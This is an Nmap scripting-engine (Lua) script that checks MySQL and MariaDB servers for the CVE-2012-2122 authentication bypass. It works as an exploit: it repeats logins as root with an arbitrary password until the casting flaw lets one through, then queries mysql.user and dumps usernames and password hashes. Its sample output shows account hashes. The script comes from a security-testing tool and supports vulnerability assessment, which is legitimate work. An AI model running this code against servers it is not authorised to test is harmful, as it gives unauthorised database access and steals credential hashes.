local mysql = require "mysql"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local openssl = stdnse.silent_require "openssl"

description = [[

Attempts to bypass authentication in MySQL and MariaDB servers by
exploiting CVE2012-2122. If its vulnerable, it will also attempt to
dump the MySQL usernames and password hashes.

All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 are
vulnerable but exploitation depends on whether memcmp() returns an
arbitrary integer outside of -128..127 range.

"When a user connects to MariaDB/MySQL, a token (SHA over a password
and a random scramble string) is calculated and compared with the
expected value. Because of incorrect casting, it might've happened
that the token and the expected value were considered equal, even if
the memcmp() returned a non-zero value. In this case MySQL/MariaDB
would think that the password is correct, even while it is not.
Because the protocol uses random strings, the probability of hitting
this bug is about 1/256.  Which means, if one knows a user name to
connect (and "root" almost always exists), she can connect using *any*
password by repeating connection attempts. ~300 attempts takes only a
fraction of second, so basically account password protection is as
good as nonexistent."

Original public advisory:
* http://seclists.org/oss-sec/2012/q2/493
Interesting post about this vuln:
* https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql
]]

---
-- @usage nmap -p3306 --script mysql-vuln-cve2012-2122 <target>
-- @usage nmap -sV --script mysql-vuln-cve2012-2122 <target>
--
-- @output
-- PORT     STATE SERVICE REASON
-- 3306/tcp open  mysql   syn-ack
-- | mysql-vuln-cve2012-2122:
-- |   VULNERABLE:
-- |   Authentication bypass in MySQL servers.
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2012-2122
-- |     Description:
-- |       When a user connects to MariaDB/MySQL, a token (SHA
-- |       over a password and a random scramble string) is calculated and compared
-- |       with the expected value. Because of incorrect casting, it might've
-- |       happened that the token and the expected value were considered equal,
-- |       even if the memcmp() returned a non-zero value. In this case
-- |       MySQL/MariaDB would think that the password is correct, even while it is
-- |       not.  Because the protocol uses random strings, the probability of
-- |       hitting this bug is about 1/256.
-- |       Which means, if one knows a user name to connect (and "root" almost
-- |       always exists), she can connect using *any* password by repeating
-- |       connection attempts. ~300 attempts takes only a fraction of second, so
-- |       basically account password protection is as good as nonexistent.
-- |
-- |     Disclosure date: 2012-06-9
-- |     Extra information:
-- |       Server granted access at iteration #204
-- |     root:*9CFBBC772F3F6C106020035386DA5BBBF1249A11
-- |     debian-sys-maint:*BDA9386EE35F7F326239844C185B01E3912749BF
-- |     phpmyadmin:*9CFBBC772F3F6C106020035386DA5BBBF1249A11
-- |     References:
-- |       https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql
-- |       http://seclists.org/oss-sec/2012/q2/493
-- |_      http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2122
--
-- @args mysql-vuln-cve2012-2122.user MySQL username. Default: root.
-- @args mysql-vuln-cve2012-2122.pass MySQL password. Default: nmapFTW.
-- @args mysql-vuln-cve2012-2122.iterations Connection retries. Default: 1500.
-- @args mysql-vuln-cve2012-2122.socket_timeout Socket timeout. Default: 5s.
---

author = "Paulino Calderon <calderon@websec.mx>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "intrusive", "vuln"}

portrule = shortport.port_or_service(3306, "mysql")

action = function( host, port )
  local vuln = {
    title = 'Authentication bypass in MySQL servers.',
    IDS = {CVE = 'CVE-2012-2122'},
    state = vulns.STATE.NOT_VULN,
    description = [[
When a user connects to MariaDB/MySQL, a token (SHA
over a password and a random scramble string) is calculated and compared
with the expected value. Because of incorrect casting, it might've
happened that the token and the expected value were considered equal,
even if the memcmp() returned a non-zero value. In this case
MySQL/MariaDB would think that the password is correct, even while it is
not.  Because the protocol uses random strings, the probability of
hitting this bug is about 1/256.
Which means, if one knows a user name to connect (and "root" almost
always exists), she can connect using *any* password by repeating
connection attempts. ~300 attempts takes only a fraction of second, so
basically account password protection is as good as nonexistent.
]],
    references = {
           'http://seclists.org/oss-sec/2012/q2/493',
           'https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql'
    },
    dates = {
      disclosure = {year = '2012', month = '06', day = '9'},
    },
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local socket = nmap.new_socket()
  local catch = function()  socket:close() end
  local try = nmap.new_try(catch)
  local result, response = {}, nil
  local status
  local mysql_user = stdnse.get_script_args(SCRIPT_NAME..".user") or "root"
  local mysql_pwd = stdnse.get_script_args(SCRIPT_NAME..".pass") or "nmapFTW"
  local iterations = stdnse.get_script_args(SCRIPT_NAME..".iterations") or 1500
  local conn_timeout = stdnse.parse_timespec(stdnse.get_script_args(SCRIPT_NAME..".socket_timeout"))
  conn_timeout = (conn_timeout or 5) * 1000

  socket:set_timeout(conn_timeout)

  --
  -- Chance of succeeding is 1/256. Let's try 1,500 to be safe.
  --
  for i=1,iterations do
    stdnse.debug1("Connection attempt #%d", i)
    try( socket:connect(host, port) )
    response = try( mysql.receiveGreeting(socket) )
    status, response = mysql.loginRequest(socket, {authversion = "post41", charset = response.charset}, mysql_user, mysql_pwd, response.salt)
    if status and response.errorcode == 0 then
      vuln.extra_info = string.format("Server granted access at iteration #%d\n", iterations)
      vuln.state = vulns.STATE.EXPLOIT
      --This part is based on mysql-dump-hashes
      local qry = "SELECT DISTINCT CONCAT(user, ':', password) FROM mysql.user WHERE password <> ''"
      local status, rows = mysql.sqlQuery(socket, qry)
      socket:close()
      if status then
        result = mysql.formatResultset(rows, {noheaders = true})
        vuln.extra_info = vuln.extra_info .. stdnse.format_output(true, result)
      end
      break
    end
    socket:close()
  end

  return vuln_report:make_output(vuln)
end
